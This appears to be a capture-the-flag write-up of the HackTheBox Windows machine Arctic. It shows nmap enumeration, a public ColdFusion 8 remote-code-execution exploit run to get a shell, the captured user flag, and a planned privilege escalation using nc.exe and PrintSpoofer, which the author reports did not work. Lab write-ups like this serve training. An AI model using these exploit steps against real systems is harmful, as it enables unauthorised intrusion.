---
title: "Artic"
date: 2025-06-20
categories:
  - HackTheBox
  - Windows
tags:
  - HackTheBox
  - Windows
---

# Artic

![](../assets/Pasted%20image%2020250608193154.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.11 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 19:33 CEST
Nmap scan report for 10.10.10.11
Host is up (0.041s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   39.95 ms 10.10.14.1
2   40.27 ms 10.10.10.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.34 seconds
```

Browsing `port` `8500`

![](../assets/Pasted%20image%2020250608195223.png)

Exploring some ColdFusion files, we see the version: `8`

![](../assets/Pasted%20image%2020250608200629.png)

## Initial Access

Using `searchsploit`, we can get an RCE for version `8`.

![](../assets/Pasted%20image%2020250609182914.png)

Executing it, we get a shell.

```shell
$ python 50057.py

Generating a payload...
Payload size: 1497 bytes
Saved as: b7172b096b3d440aa353a65a5d0acac3.jsp

...


...

Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

Get the flag:

```shell
C:\Users\tolis\Desktop>type user.txt
type user.txt
f7e361c9b62bb18b40ca4fc348bf549f
```

## Privilege Escalation

```shell
whoami /priv                                                                                           
                                                                                                       
PRIVILEGES INFORMATION                                                                                 
----------------------                                                                                 
                                                                                                       
Privilege Name                Description                               State                          
============================= ========================================= ========                       
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled                        
SeImpersonatePrivilege        Impersonate a client after authentication Enabled                        
SeCreateGlobalPrivilege       Create global objects                     Enabled                        
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

The user has `SeImpersonatePrivilege`, so transfer `nc.exe` and `PrintSpoofer` to the machine.

!!! bug

    I can't get it to work.